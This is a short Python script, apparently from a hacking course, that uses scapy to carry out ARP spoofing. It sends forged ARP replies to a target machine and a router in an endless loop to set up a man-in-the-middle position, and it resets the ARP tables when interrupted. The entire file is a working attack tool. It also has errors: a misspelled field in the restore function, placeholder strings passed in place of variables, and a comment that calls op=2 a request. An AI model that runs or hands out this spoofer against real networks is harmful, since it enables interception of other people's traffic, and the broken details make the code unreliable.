#!/usr/bin/env python
import sys
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #ethernet object
    arp_request_broadcast= broadcast/arp_request # / = append
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #2 lists and we keep the 1. Verbose false means less uneccessary info
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) #op=2 because we want to send a request
    scapy.send(packet, verbose=False) #no output

def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwrc=source_mac)
    scapy.send(packet,count=4,verbose=False) #send it 4 times to make sure


target_ip="target ip"
gateaway_ip="router ip"

try:
    number_of_packets = 0
    while True:
        spoof(target_ip,gateaway_ip)
        spoof("router_ip","target ip")
        number_of_packets+=2
        print("\r[+] Sent "+str(number_of_packets)+" packets"), #\r write at the start of line so we overwrite every print
        sys.stdout.flush()
        time.sleep(2) #wait 2 sec
except KeyboardInterrupt :
    print("[+] Detected CTRL + C ...... Resetting ARP tables \n")
    restore(target_ip, gateaway_ip)
    restore(gateaway_ip, target_ip)

